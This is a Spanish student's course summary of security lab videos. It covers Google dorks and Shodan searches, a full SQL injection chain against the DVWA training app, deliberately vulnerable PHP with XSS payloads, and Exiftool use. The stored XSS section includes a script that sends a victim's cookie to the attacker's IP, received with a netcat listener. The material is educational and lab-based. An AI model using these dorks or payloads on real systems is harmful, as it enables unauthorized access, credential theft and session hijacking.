# Videos de prácticas de los cursos de seguridad de Openwebinars.

## Introducción 

Debido a la gran cantidad de prácticas que se realizan en los cursos de Openwebinars, y que algunas de esas herramientas ya han sido vistas durante el módulo de seguridad de ASIR, no voy a realizar videos de todo lo que se ve en la carrera de ciberseguridad porque daría para muchos videos.

Por lo tanto lo que he realizado son algunos videos en donde se realizan prácticas de aquellos temas que he visto más interesante, han sido repetidos en varios de los cursos de seguridad y no han sido vistos en el módulo de seguridad.

## Google hacking y Shodan

### [Primer Video](https://youtu.be/sTft-cRLNxA)

En este primer video se verá el primer paso que realiza todo auditor de seguridad o persona que quiera realizar un ataque, el cual consiste en recabar toda la información que se pueda de una posible víctima.

Para ello se realizará búsquedas de archivos __robot.txt__ con el motor de búsqueda de Google.
Estos archivos robot.txt  son archivos de texto sin formato en el cual se configuraran las páginas web cara a los rastreadores de google, en los archivos robots.txt las etiquetas más usadas son _Disallow_ con la cual le estaremos diciendo a los rastreadores de google que no muestre ese archivo o directorio, y la etiqueta _Allow_ hará lo contrario, decirle a los navegadores que sí debe mostrar en las búsquedas.

Con una simple búsqueda avanzada (Dorks) podemos encontrar cantidad de ejemplos de archivos robots.txt donde podremos ver la conflagración de la página web sobre los crawler (_también se conoce como rastreador, araña o robot_) de google, donde veremos qué directorios se mostrarán a los crawlers y cuáles no.

Con los archivos robots.txt podemos conseguir mucha e importante información para crearnos posteriormente un vector de ataque más refinado, existen archivos y directorios los cuales deberían de estar protegidos ya que o bien son información privilegiada o datos sensibles de terceros, por ello se realizarán algunas búsquedas con las cuales podríamos encontrar información relevante con esos archivos robots.txt.

Dorks que usaremos en nuestras búsquedas de los archivos robot.txt.

~~~
inurl:robots.txt filetype:txt "Disallow: /phpmyadmin"
~~~

Este Dorks lo que significa es que buscara en la url archivos robots.txt cuyo tipo de fichero sean .txt donde aparezca el directorio /phpmyadmin como Disallow.
Con esto si encontramos un inicio de sesión podemos posteriormente ejecutar un ataque de fuerza bruta por ejemplo.

~~~
inurl:"/robots.txt" + "Disallow: passwords.txt"
~~~

Con este otro Dork definimos que en los archivos robots.txt aparezca  Disallow: passwords.txt
Lo normal es que no se muestre estos archivos, de un error de 404, o algo por el estilo, pero si alguno se habré aunque diga _no access_ por ejemplo nos indica de que existe ese fichero, pero que no tenemos acceso. Aun así es un riesgo.

~~~
inurl:"/robots.txt" + "Disallow: plesk-stat"
~~~

Con este Dork buscaremos si tienen instalado un __plesk-stat__  (servicio de paginas web en internet).
Si nos aparece para logearnos al igual que con el dork de phpmyadmin, se puede intentar hacer un ataque de fuerza bruta.

~~~
inurl:robots.txt filetype:txt "/wp-login" site:gov
~~~

Con este Dork pretendemos buscar en los archivos robot.txt el login de un wordpress, con él site:gov definimos la búsqueda a dominios del gobierno.

~~~
inurl:robots.txt intext:CHANGELOG.txt intext:disallow ext:txt -site:github.com
~~~

Con este Dorks buscaremos archivos robots.txt con _intext_ definimos que en el cuerpo de la página web nos encuentre CHANGELOG.txt y la palabra disallow, con _ext_ definimos la extensión que será .txt y con _-site_ es para no incluir el dominio github.com.
Toda la información que nos de un archivo logs nos puede servir para ver qué servicio usa, su versión, los parches que tiene, etc. Para posteriormente buscar exploit frente a ese servicio y versión.

En la última parte del video veremos algunos ejemplos de búsquedas con el motor de búsqueda Shodan el cual es un buscador de sistemas y servicios conectados a internet con el cual podemos buscar todo tipo de sistemas conectados a Internet, este navegador está calificado como uno de los más peligrosos de Internet ya que expone al público todo tipo de servicios ya sean vulnerables o no, pudiendo dar paso a ataques mucho más sofisticados, es un navegador muy útil para las auditorías y hacking ético, pero el gran problema son los ciberdelincuentes que hacen uso de este buscador para comprometer sistemas y llevar a cabo ataques a gran escala y a nivel mundial.

Ejemplos de operadores lógicos:
- country (filtraremos por países)
- port (nos filtra por puertos)
- title (nos buscará por cabeceras)
- os (nos buscará por sistema operativo)

Algunos de los ejemplos que veremos será ver dispositivos en españa con _country:es_, podemos concretar con el operador _city_ una ciudad en concreto, seleccionaremos alguno para ver toda la información que nos da shodan, también realizaremos un consulta a equipos de Rusia que tengan Samba buscando el puerto 445 con _country:ru port:445_, y por último buscaremos cámaras web de android.

Uno de los problemas de esta práctica es que cuando realizas muchos Dorks  en Goolge, es posible que te salte la típica advertencia para comprobar si eres un bots.
Con Shodan para poder realizar las búsquedas lo primero que debes hacer es registrarte, y al igual que google tiene un determinado número de consultas por día como se podrá ver en el video donde nos dará un error en una de las consultas, por ello se ha de esperar 24 horas hasta poder realizar de nuevo consultas, por eso el otro video mas corto es solo de consultas shodan. 

### [Segundo video](https://youtu.be/8clDK_9lm-A)

Este video es sobre las consultas en el servidor Shodan debido a que en el primero saltó el error de no poder realizar más consultas en ese día.

## [SQL Injection](https://youtu.be/rOrwRrh_BFA)

En este video se realizará la práctica vista en uno de los cursos de seguridad sobre __SQL Injection__ el cual es un método de infiltración de código, ante la falta de validación de campos, en operaciones sobre una base de datos.

Esta técnica que consiste en inyectar código malicioso en aplicaciones web, se usa para que una persona no autorizada busque tener acceso a la información como:
- usuarios y contraseñas
- Acceso al servidor
- Acceso al panel de administración
- Robo de datos de visitantes
- Ingeniería social con los usuarios

Esto desemboca en problemas de confidencialidad, autenticación e integridad.

La práctica se realizará en una kali linux donde se tendrá instalado la página web de __DVWA__, la cual requiere de tener instalado un servicio apache, php y mysql.
Dejaremos la seguridad en _Low_, ya que es un prueba y nos aprovecharemos de la vulnerabilidad de la base de datos de aceptar la lógica _1=1_.

Accediendo a la pestaña _SQL Injection_ aparece un campo _User ID_ en el que se puede insertar un número. Si dicho usuario existe nos devolverá información del mismo.
Al añadir números como 1, 2, 3 recibimos respuesta del usuario que ocupa dicho “id”

~~~
2' and 1=1 #
~~~
Esto nos devuelve la segunda entrada (Gordon) de la base de datos, por lo que está interpretando la expresión que se encuentra a su derecha

~~~
2' and 1=1 order by 3 #
~~~
Da un error (unknown column 3) ya que no existe dicha columna, porque la consulta solo nos devuelve los campos _First_name y Surname_. Al ordenar la salida nos da la pista de que quizás se puedan ejecutar acciones en la propia consulta

~~~
2' and 1=1 union select 1,versión() #
~~~
En este caso nos devuelve la versión concreta de la base de datos.

~~~
2' and 1=1 union select 1,user() #
~~~
Usuario administrador de la base de datos.

~~~
2' and 1=1 union select 1,database() #
~~~
Nombre de la base de datos.

~~~
2' and 1=1 union select 1,table_name from information_schema.tables #
~~~
Nombre de todas las tablas, entre las que destaca una de usuarios  _users_ a la que podemos atacar. 

~~~
2' and 1=1 union select 1,table_name from information_schema.tables where table_schema!='mysql' and table_schema!='information_schema' and  table_schema!='performance_schema' #
~~~
Se filtra la base de datos information_schema, performance_schema y mysql

~~~
2' and 1=1 union select 1,column_name from information_schema.columns where table_name='users' #
~~~
Se accede dentro de la tabla y se listan las columnas que tiene

~~~
2' and 1=1 union select 1,concat(first_name,0x0a,password) from users #
~~~
Se obtiene los usuarios con las contraseñas en md5. El _0x0a_ es un _Enter_ en hexadecimal.
- admin: 5f4dcc3b5aa765d61d8327deb882cf99
- Gordon: e99a18c428cb38d5f260853678922e03
- Hack: 8d3533d75ae2c3966d7e0d4fcc69216b
- Pablo: 0d107d09f5bbe40cade3de5c71e9e9b7
- Bob: 5f4dcc3b5aa765d61d8327deb882cf99

Para descifrar la password se puede utilizar algún servicio online como:
https://hashes.com/en7decrypt/hash

## XSS

### [Primer Video](https://youtu.be/kMA1y-SLnlg)

En este video se realizará una de las prácticas realizadas en uno de los cursos de seguridad sobre ataques con __XSS__ este  es un ataque dirigido a páginas web y consistente en
poder inyectar código HTML y Javascript sin que sea validado para conseguir algún provecho.

Este vector de ataque es usado para robar:
- Información sensible
- Secuestrar sesiones de usuario
- Subyugar en la integridad del sistema

Existen dos tipos de XSS
- Directa
	- También conocida como persistente
	- Difícil de encontrar
	- Suele encontrarse en formularios
	- Con este método, siempre que alguien entre en la ruta donde se ha inyectado el código se ejecutará en su navegador
- Indirecta
	- También conocida como reflejada
	- Más fácil de encontrar
	- Código inyectado a través de formularios, URL, programas en Flash o incluso vídeos
	- Complicado tener éxito ya que hay que conseguir que alguien entre en el enlace malicioso.

Primero se realizará tres ejemplos, donde tendremos creados tres archivos dentro de apache con archivos index.html y xss.php.

- Ejemplo 1
Este ejemplo dispone de una caja donde se podrá insertar texto (por ejemplo un nombre). Al pulsar el botón _enviar_ se ejecutará un fichero _.php_ que imprimirá por pantalla el texto que se ha escrito.

index.html
~~~
<HTML>
  <HEAD>
    <TITLE>Vulnerabilidad XSS</TITLE>
  </HEAD>
  <BODY>
   <FORM METHOD="get" ACTION="xss.php">
     <INPUT TYPE="text" NAME="vuln">
     <BR><BR>
     <INPUT TYPE="submit" VALUE="enviar">
   </FORM>
 </BODY>
</HTML>
~~~

xss.php
~~~
<?php
    $var = $_GET["vuln"];
    echo "Has escrito: ".$var;
?>
~~~

Desde el propio navegador de la máquina virtual se puede insertar un nombre como iespoligonosur y nos lo devolverá impreso el código _php_ por pantalla. Para comprobar si es vulnerable se puede insertar lo siguiente:
~~~
<SCRIPT>alert(5);</SCRIPT>
~~~
Y efectivamente, al no validarse lo que se le inserta en los campos, el navegador devolverá una alerta con el mensaje “5”.

- Ejemplo 2
En este caso solo se modifica el código xss, el index.html será el mismo que en el ejemplo 1. Lo que se hace es que se va a imprimir lo que se escriba pero dentro de una caja, por tanto, al intentar insertar un _alert_, lo mismo que en el ejemplo anterior, no funciona.

xss.php
~~~
<?php
    $var = $_GET["vuln"];
?>
<FORM>
    Has escrito: <INPUT TYPE="text" VALUE="<?php echo $var; ?>">
</FORM>  
~~~

En este caso, para conseguir comprobar que efectivamente funciona el XSS si se mira el código fuente de la página, se podrá ver que existe una caja de tipo _text_ que será necesario cerrar antes de poder insertar la prueba:
~~~
"><SCRIPT>alert(5);</SCRIPT>
~~~
Ahora sí funciona, ya que se está cerrando la caja antes de la alerta:
~~~
<INPUT TYPE="text" VALUE=""><SCR...
~~~

- Ejemplo 3
En el último de estos ejemplos prácticos se va a quitar la caja en la que se puede insertar texto en el _index.html_, solo se van a poder pulsar dos botones _HOLA o ADIOS_. El fichero _xss.php_ será el mismo del primer ejemplo pero el _body del html_ cambiará ligeramente:

index.html
~~~
<HTML>
  <HEAD>
    <TITLE>Vulnerabilidad XSS</TITLE>
  </HEAD>
  <BODY>
    <A HREF=“xss.php?vuln=hola”>HOLA</A>
    <A HREF=“xss.php?vuln=adiós”>ADIÓS</A>
  </BODY>  
</HTML>
~~~
La forma saber si es vulnerable a XSS, será realizando la comprobación a través de la URL directamente:
~~~
http://localhost/xss3/xss.php?vuln=<SCRIPT>alert(5);</SCRIPT>
~~~
### [Segundo Video de XSS](https://youtu.be/KrW_g0RX2uA)

En esta segunda parte del video se realizará las prácticas en el entorno web DVWA, donde se realizará una prueba persistente.
XSS Persistente (Stored)
El XSS persistente, como su propio nombre indica, permanecerá en la página donde se haya insertado el código y cada vez que se acceda a la misma se ejecutará dicho código.
Este ejemplo es como un libro de firmas en el que se puede poner el nombre y el mensaje que se quiere dejar en el libro de firmas.
Supongamos que el atacante accede con su usuario y contraseña _1337:charley_ pero quiere conseguir robar la cookie de otro usuario para poder robarle la sesión. Deberá acceder al apartado _XSS persistent_ vulnerable a este tipo de ataque e introducir lo siguiente
~~~
Name: iespoligonosur
Message: <script>new Image().src="http://ip de nuestro equipo:puerto que queramos?"+document.cookie;</script>
~~~
Será necesario levantar un servicio a la escucha por si llega información de alguien que entre (nc -lvp puerto definido en el script) por ejemplo, en la propia máquina Kali DVWA y que desde otro equipo se acceda con la cuenta del administrador.

Si se accede a través de alguna herramienta de __CookieManager__ y se cambia la cookie, al actualizar el home de DVWA se habrá robado la sesión del Administrador.

## [Exiftool](https://youtu.be/OxcxKxX9lKQ)

### Datos Exif

Los datos Exif son los datos de los datos, que quiere decir esto, por ejemplo, tenemos una imagen en formato .jpg de la cual sabemos que es una imagen por el formato, eso es información del archivo ahora los datos exif en esa imagen serían, la cámara con la que se hizo, si tenía o no el flash activado, el formato, el tamaño, la fecha en que fue creada los formatos de colores, etc .

### Herramienta Exiftool

Exiftool es una herramienta de extracción y edición de metadatos de casi cualquier archivo, ya sean estos de texto, software o imágenes existen muchas herramientas enfocadas a la edición y lectura de los metadatos, lo podemos usar desde la terminal (cmd) o con entorno gráfico para tener un entorno de la herramienta más amigable y fácil de usar.
Podemos instalar Exiftool en dispositivos _Debian, Ubuntu, Mint, Kali_ con el siguiente comando:
~~~
 sudo apt install libimage-exiftool-perl
~~~

En este video se verá los metadatos que contienen dos imágenes una en _.CR2 y la otra en .JPG_. Para ello tan solo deberemos escribir __exiftool__ y luego el nombre de la imagen.

Después se le introduce un nombre de Artista con el comando:
~~~
exiftool -P -Artist=”nombre que nosotros queramos” -overwrite_original nombre_de_la_imagen.jpg
~~~

Y comprobaremos como efectivamente se ha introducido dicho dato.

Luego introduciremos coordenadas GPS como la latitud y la longitud, al hacer esto se creará un Backup de la imagen original.
Y comprobaremos si se han introducido los datos de gps.

Para introducir estos datos usaremos el comando:
~~~
exiftool -exif:gpslatitude=”38.951206600” nombre_imagen.jpg -exi:gpslatituderef=S -exif:gpslongitude=”-77.151290800”
~~~

Evidentemente los datos de la longitud y latitud son de ejemplo se pueden introducir los que uno quiera.

[Inicio](https://franciscocadena.github.io/Resumen-Curso-Ciberseguridad/)
